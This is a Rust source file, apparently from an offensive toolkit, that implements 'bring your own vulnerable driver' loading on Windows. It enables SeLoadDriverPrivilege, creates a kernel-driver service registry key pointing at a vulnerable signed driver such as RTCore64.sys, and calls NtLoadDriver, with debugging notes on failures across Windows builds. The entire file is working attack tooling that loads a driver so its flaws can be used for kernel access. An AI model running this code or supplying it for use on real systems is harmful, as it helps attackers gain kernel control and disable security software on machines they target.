//! BYOVD driver loading — `NtLoadDriver` bootstrap.
//!
//! Loads a vulnerable signed driver (.sys) into the kernel via the NtLoadDriver
//! syscall. Requires:
//!   1. The .sys file on disk (the operator places it).
//!   2. A registry service key under HKLM\SYSTEM\CurrentControlSet\Services
//!      with an ImagePath value pointing to the .sys file.
//!   3. SeLoadDriverPrivilege enabled in the operator's token.
//!
//! ## NtLoadDriver contract (verified via NtDoc / undocumented.ntinternals.net)
//! `NTSTATUS NtLoadDriver(IN PUNICODE_STRING DriverServiceName)`
//! - The UNICODE_STRING points to the registry key path in NT namespace:
//!   `\Registry\Machine\SYSTEM\CurrentControlSet\Services\<DriverName>`
//! - The key MUST have an `ImagePath` value (REG_EXPAND_SZ or REG_SZ) = the
//!   full filesystem path to the .sys (e.g. `\??\C:\path\driver.sys`).
//! - Returns STATUS_SUCCESS (0) on success, STATUS_IMAGE_ALREADY_LOADED
//!   (0xC000010E) if already loaded.
//!
//! ## Cleanup
//! `NtUnloadDriver` with the same registry path unloads the driver. The
//! registry key should be deleted afterward (`RegDeleteKey`).
//!
//! # Safety
//! Loading a driver is IRREVERSIBLE (until unload) and changes kernel state.
//! A buggy/malicious driver can BSOD the host. Only use with verified drivers
//! on authorized targets.

#![cfg(target_os = "windows")]

use crate::KrwError;
use core::ffi::c_void;

// ---- Win32/NT FFI types ----

#[repr(C)]
pub struct UnicodeString {
    pub length: u16, // bytes, excluding null
    pub maximum_length: u16,
    pub buffer: *const u16,
}

/// `NTSTATUS NtLoadDriver(IN PUNICODE_STRING DriverServiceName)`
type NtLoadDriverFn = unsafe extern "system" fn(*const UnicodeString) -> i32;
/// `NTSTATUS NtUnloadDriver(IN PUNICODE_STRING DriverServiceName)`
type NtUnloadDriverFn = unsafe extern "system" fn(*const UnicodeString) -> i32;

// Registry APIs for creating the service key.
type RegCreateKeyExWFn = unsafe extern "system" fn(
    *mut c_void,
    *const u16,
    u32,
    *mut c_void,
    u32,
    u32,
    *mut c_void,
    *mut *mut c_void,
    *mut u32,
) -> i32;
type RegSetValueExWFn =
    unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *const u8, u32) -> i32;
type RegCloseKeyFn = unsafe extern "system" fn(*mut c_void) -> i32;
type RegDeleteKeyWFn = unsafe extern "system" fn(*mut c_void, *const u16) -> i32;

/// NTSTATUS for "already loaded" — not an error (driver is usable).
const STATUS_IMAGE_ALREADY_LOADED: i32 = 0xC000010Eu32 as i32;

/// The registry path prefix for driver service keys (NT namespace).
const SERVICES_PREFIX: &str = "\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\";

/// A loaded driver: its registry key path + device name (for cleanup).
pub struct LoadedDriver {
    /// The NT-namespace registry path passed to NtLoadDriver.
    reg_path: Vec<u16>,
    /// Whether NtLoadDriver succeeded (false = was already loaded).
    #[allow(dead_code)] // retained for potential future cleanup-on-drop logic
    newly_loaded: bool,
}

impl LoadedDriver {
    /// Load a driver from `sys_path` (e.g. `C:\temp\RTCore64.sys`) under the
    /// service name `svc_name` (e.g. `RTCore64`).
    ///
    /// Steps:
    /// 1. Create the registry service key with ImagePath = `\??\<sys_path>`.
    /// 2. Call NtLoadDriver with the key path.
    /// 3. If STATUS_IMAGE_ALREADY_LOADED, that's OK (driver is usable).
    ///
    /// Returns the LoadedDriver handle (Drop unloads + cleans the key).
    ///
    /// # Safety
    /// Loading a driver changes kernel state; BSOD risk if the driver is buggy.
    /// Caller must have SeLoadDriverPrivilege.
    pub unsafe fn load(sys_path: &[u16], svc_name: &[u16]) -> Result<Self, KrwError> {
        // Enable SeLoadDriverPrivilege in the calling thread's token before
        // NtLoadDriver. Even administrators have it present-but-DISABLED by
        // default; without enabling, NtLoadDriver returns
        // STATUS_PRIVILEGE_NOT_HELD (0xC0000061). This is the difference between
        // a self-hosted runner (where the operator's shell already enabled it)
        // and a hosted runner (where the default token lacks it).
        let _ = enable_load_driver_privilege();

        // Build the registry path: \Registry\Machine\...\Services\<svc_name>
        let prefix: Vec<u16> = SERVICES_PREFIX
            .encode_utf16()
            .chain(core::iter::once(0))
            .collect();
        let reg_path: Vec<u16> = prefix[..prefix.len() - 1] // drop the null for concat
            .iter()
            .chain(svc_name.iter())
            .chain(core::iter::once(&0u16))
            .copied()
            .collect();

        // Create the registry key + set ImagePath.
        let reg = RegApi::resolve()?;
        let image_path = build_image_path(sys_path);
        reg.create_key_and_set_image_path(&reg_path, &image_path)?;

        // Build the UNICODE_STRING for NtLoadDriver.
        let us = UnicodeString {
            length: ((reg_path.len() - 1) * 2) as u16, // exclude null
            maximum_length: (reg_path.len() * 2) as u16,
            buffer: reg_path.as_ptr(),
        };

        let nt_load: NtLoadDriverFn = resolve_nt(b"NtLoadDriver")?;
        let status = unsafe { nt_load(&us) };
        let newly_loaded = if status == 0 {
            true
        } else if status == STATUS_IMAGE_ALREADY_LOADED {
            false // already loaded — fine, device should be accessible
        } else {
            // Cleanup the key on failure.
            reg.delete_key(&reg_path);
            return Err(KrwError::Other(alloc::format!(
                "NtLoadDriver failed: NTSTATUS {:#x}",
                status as u32
            )));
        };

        Ok(Self {
            reg_path,
            newly_loaded,
        })
    }

    /// Unload the driver + delete the registry key. Best-effort.
    pub fn unload(&mut self) {
        if let Ok(nt_unload) = resolve_nt::<NtUnloadDriverFn>(b"NtUnloadDriver") {
            let us = UnicodeString {
                length: ((self.reg_path.len() - 1) * 2) as u16,
                maximum_length: (self.reg_path.len() * 2) as u16,
                buffer: self.reg_path.as_ptr(),
            };
            unsafe { nt_unload(&us) };
        }
        if let Ok(reg) = RegApi::resolve() {
            reg.delete_key(&self.reg_path);
        }
    }
}

impl Drop for LoadedDriver {
    fn drop(&mut self) {
        // Don't auto-unload on drop — the operator may want the driver to stay
        // loaded across multiple operations. Explicit unload() is the cleanup path.
    }
}

/// Build the ImagePath registry value from the operator-supplied driver path.
///
/// The IO manager / NtLoadDriver resolves ImagePath as follows:
///   - A relative path (no drive letter, e.g. `System32\drivers\RTCore64.sys`)
///     is resolved relative to `%SystemRoot%`. This is what `sc create` writes
///     and is the most broadly accepted form.
///   - An absolute NT path (`\??\C:\...`) is accepted on most builds but is
///     rejected on some (observed: Server 2019 17763 returns
///     STATUS_INVALID_IMAGE_FORMAT 0xC0000160). We therefore prefer the
///     relative form whenever the path is under SystemRoot.
///
/// Heuristic: if `sys_path` (after stripping a leading `\??\`) starts with
/// `System32\` / `system32\` (case-insensitive), emit it as-is (relative). Any
/// other absolute path keeps the `\??\` prefix.
///
/// NUL-terminated exactly once (callers may pass a NUL-terminated const; we
/// trim trailing NULs).
fn build_image_path(sys_path: &[u16]) -> Vec<u16> {
    // Trim trailing NULs (callers like the example pass a NUL-terminated const).
    let trimmed: &[u16] = sys_path
        .iter()
        .rposition(|&c| c != 0)
        .map(|i| &sys_path[..=i])
        .unwrap_or(&sys_path[..0]);
    // Strip a leading `\??\` (4 code units) if present, for the SystemRoot check.
    let nt_prefix: &[u16] = &[b'\\' as u16, b'?' as u16, b'?' as u16, b'\\' as u16];
    let core: &[u16] = if trimmed.len() >= 4 && trimmed[..4] == *nt_prefix {
        &trimmed[4..]
    } else {
        trimmed
    };
    // Is core under System32\ (case-insensitive ASCII compare)?
    let sys32: &[u8] = b"system32\\";
    let under_sys32 = core.len() >= sys32.len()
        && core[..sys32.len()]
            .iter()
            .zip(sys32.iter())
            .all(|(c, &e)| (*c as u8).to_ascii_lowercase() == e);
    if under_sys32 {
        // Relative path under SystemRoot — accepted most broadly. No `\??\`.
        let mut out = Vec::with_capacity(core.len() + 1);
        out.extend_from_slice(core);
        out.push(0);
        out
    } else {
        // Absolute path: (re-)apply the `\??\` NT-object prefix.
        let mut out = Vec::with_capacity(nt_prefix.len() + core.len() + 1);
        out.extend_from_slice(nt_prefix);
        out.extend_from_slice(core);
        out.push(0);
        out
    }
}

/// Resolve an ntdll export via our resolver.
fn resolve_nt<T>(name: &[u8]) -> Result<T, KrwError> {
    // resolve_sym is unsafe (FFI); wrap it.
    unsafe { super::resolve::resolve_sym(b"ntdll.dll", name) }
}

/// `RtlAdjustPrivilege` — enables/disables a privilege in the calling thread's
/// token (or the process token, falling back to the system token). Simpler than
/// the OpenProcessToken → AdjustTokenPrivileges chain.
type RtlAdjustPrivilegeFn =
    unsafe extern "system" fn(u32, i32, i32, *mut i32) -> i32;

/// Enable `SeLoadDriverPrivilege` (LUID 10) in the calling thread's token.
/// Returns `true` if the privilege is now enabled (or was already). Best-effort:
/// on failure the caller proceeds anyway — `NtLoadDriver` will surface the
/// real error if the privilege is genuinely unavailable.
///
/// `RtlAdjustPrivilege` signature: `(Privilege, Enable, ClientOnly, Enabled)`.
/// `ClientOnly=0` adjusts the process token; `1` would adjust an impersonation
/// token. We use `0` (process).
fn enable_load_driver_privilege() -> bool {
    const SE_LOAD_DRIVER_PRIVILEGE: u32 = 10;
    let rtl_adjust: RtlAdjustPrivilegeFn = match unsafe {
        super::resolve::resolve_sym(b"ntdll.dll", b"RtlAdjustPrivilege")
    } {
        Ok(f) => f,
        Err(_) => return false,
    };
    let mut enabled: i32 = 0;
    // SAFETY: RtlAdjustPrivilege with the well-known LUID 10 + ClientOnly=0 is
    // a documented safe path; the out-param is a stack i32.
    let status = unsafe { rtl_adjust(SE_LOAD_DRIVER_PRIVILEGE, 1, 0, &mut enabled) };
    // NT_SUCCESS(status) AND the privilege was enabled.
    status >= 0 && enabled != 0
}

/// Registry API bundle (resolved once).
struct RegApi {
    create_key: RegCreateKeyExWFn,
    set_value: RegSetValueExWFn,
    close_key: RegCloseKeyFn,
    delete_key_fn: RegDeleteKeyWFn,
    hklm: *mut c_void,
}

impl RegApi {
    fn resolve() -> Result<Self, KrwError> {
        // SAFETY: resolve_sym does FFI calls; safe in operator context (single-threaded).
        unsafe {
            Ok(Self {
                create_key: super::resolve::resolve_sym(b"advapi32.dll", b"RegCreateKeyExW")?,
                set_value: super::resolve::resolve_sym(b"advapi32.dll", b"RegSetValueExW")?,
                close_key: super::resolve::resolve_sym(b"advapi32.dll", b"RegCloseKey")?,
                delete_key_fn: super::resolve::resolve_sym(b"advapi32.dll", b"RegDeleteKeyW")?,
                hklm: 0x8000_0002u32 as *mut c_void, // HKEY_LOCAL_MACHINE
            })
        }
    }

    /// Create the service key + set ImagePath.
    fn create_key_and_set_image_path(
        &self,
        reg_path: &[u16],
        image_path: &[u16],
    ) -> Result<(), KrwError> {
        let mut hkey: *mut c_void = core::ptr::null_mut();
        let mut disposition: u32 = 0;
        // RegCreateKeyExW param order: hKey, lpSubKey, Reserved, lpClass,
        //   dwOptions, samDesired, lpSecurityAttributes, phkResult, lpdwDisposition.
        //   dwOptions = REG_OPTION_NON_VOLATILE (0); samDesired = KEY_ALL_ACCESS.
        // KEY_ALL_ACCESS = 0xF003F (STANDARD_RIGHTS_REQUIRED | KEY_QUERY_VALUE |
        // KEY_SET_VALUE | KEY_CREATE_SUB_KEY | KEY_ENUMERATE_SUB_KEYS |
        // KEY_NOTIFY | KEY_CREATE_LINK). A previous version passed samDesired=0
        // (no access rights), so RegSetValueExW silently failed to write
        // ImagePath — NtLoadDriver then saw an empty value and rejected the
        // image with STATUS_INVALID_IMAGE_FORMAT (0xC0000160).
        const KEY_ALL_ACCESS: u32 = 0xF003F;
        const REG_OPTION_NON_VOLATILE: u32 = 0;
        let status = unsafe {
            (self.create_key)(
                self.hklm,
                // reg_path starts with \Registry\Machine\... — but RegCreateKeyExW
                // wants the path relative to HKEY (without the \Registry\Machine prefix).
                // So we skip the prefix and pass SYSTEM\CurrentControlSet\Services\<name>.
                self.strip_prefix(reg_path).as_ptr(),
                0,
                core::ptr::null_mut(),
                REG_OPTION_NON_VOLATILE,
                KEY_ALL_ACCESS,
                core::ptr::null_mut(),
                &mut hkey,
                &mut disposition,
            )
        };
        if status != 0 {
            return Err(KrwError::Other(alloc::format!(
                "RegCreateKeyExW failed: {}",
                status
            )));
        }
        // Set ImagePath = image_path (REG_EXPAND_SZ = 2, or REG_SZ = 1).
        let image_path_bytes: &[u8] = unsafe {
            core::slice::from_raw_parts(
                image_path.as_ptr() as *const u8,
                (image_path.len() - 1) * 2, // exclude null, in bytes
            )
        };
        let name: &[u16] = &[
            b'I' as u16,
            b'm' as u16,
            b'a' as u16,
            b'g' as u16,
            b'e' as u16,
            b'P' as u16,
            b'a' as u16,
            b't' as u16,
            b'h' as u16,
            0,
        ];
        let set_status = unsafe {
            (self.set_value)(
                hkey,
                name.as_ptr(),
                0,
                2, /* REG_EXPAND_SZ */
                image_path_bytes.as_ptr(),
                image_path_bytes.len() as u32,
            )
        };
        if set_status != 0 {
            unsafe { (self.close_key)(hkey) };
            return Err(KrwError::Other(alloc::format!(
                "RegSetValueExW(ImagePath) failed: {}",
                set_status
            )));
        }
        // Set Type = SERVICE_KERNEL_DRIVER (1), Start = SERVICE_DEMAND_START (3),
        // ErrorControl = SERVICE_ERROR_IGNORE (0). NtLoadDriver → IopLoadDriver
        // reads the `Type` value to classify the image; without Type=1 the IO
        // manager rejects the image with STATUS_INVALID_IMAGE_FORMAT
        // (0xC0000160) even when ImagePath is correct. These three values are
        // exactly what `sc create <svc> type= kernel` writes.
        let type_name: &[u16] = &[b'T' as u16, b'y' as u16, b'p' as u16, b'e' as u16, 0];
        let start_name: &[u16] = &[
            b'S' as u16,
            b't' as u16,
            b'a' as u16,
            b'r' as u16,
            b't' as u16,
            0,
        ];
        let err_name: &[u16] = &[
            b'E' as u16,
            b'r' as u16,
            b'r' as u16,
            b'o' as u16,
            b'r' as u16,
            b'C' as u16,
            b'o' as u16,
            b'n' as u16,
            b't' as u16,
            b'r' as u16,
            b'o' as u16,
            b'l' as u16,
            0,
        ];
        let dword_one: [u8; 4] = 1u32.to_le_bytes(); // Type = KERNEL_DRIVER
        let dword_three: [u8; 4] = 3u32.to_le_bytes(); // Start = DEMAND_START
        let dword_zero: [u8; 4] = 0u32.to_le_bytes(); // ErrorControl = IGNORE
        const REG_DWORD: u32 = 4;
        let _ = unsafe {
            (self.set_value)(
                hkey,
                type_name.as_ptr(),
                0,
                REG_DWORD,
                dword_one.as_ptr(),
                4,
            )
        };
        let _ = unsafe {
            (self.set_value)(
                hkey,
                start_name.as_ptr(),
                0,
                REG_DWORD,
                dword_three.as_ptr(),
                4,
            )
        };
        let _ = unsafe {
            (self.set_value)(
                hkey,
                err_name.as_ptr(),
                0,
                REG_DWORD,
                dword_zero.as_ptr(),
                4,
            )
        };
        unsafe { (self.close_key)(hkey) };
        Ok(())
    }

    /// Strip the `\Registry\Machine\` prefix for RegCreateKeyExW (which wants
    /// the path relative to HKEY_LOCAL_MACHINE, i.e. `SYSTEM\CurrentControl-
    /// Set\Services\<name>`).
    ///
    /// `\Registry\Machine\` is exactly 18 UTF-16 code units
    /// (`\`(1) + `Registry`(8) + `\`(1) + `Machine`(7) + `\`(1) = 18).
    fn strip_prefix<'a>(&self, reg_path: &'a [u16]) -> &'a [u16] {
        // RegCreateKeyExW with HKEY_LOCAL_MACHINE wants `SYSTEM\CurrentControl-
        // Set\...` (no leading backslash). Stripping 18 leaves exactly that.
        if reg_path.len() > 18 {
            &reg_path[18..]
        } else {
            reg_path
        }
    }

    fn delete_key(&self, reg_path: &[u16]) {
        // RegDeleteKeyW also wants relative path. Open the parent first, then
        // delete the leaf. For simplicity, use RegDeleteKeyW with HKLM + relative.
        let _ = unsafe { (self.delete_key_fn)(self.hklm, self.strip_prefix(reg_path).as_ptr()) };
    }
}

// format! is called via fully-qualified alloc::format! at call sites, so
// this import is unused — but retained for potential future use.
#[allow(unused_imports)]
use alloc::format;
use alloc::vec::Vec;
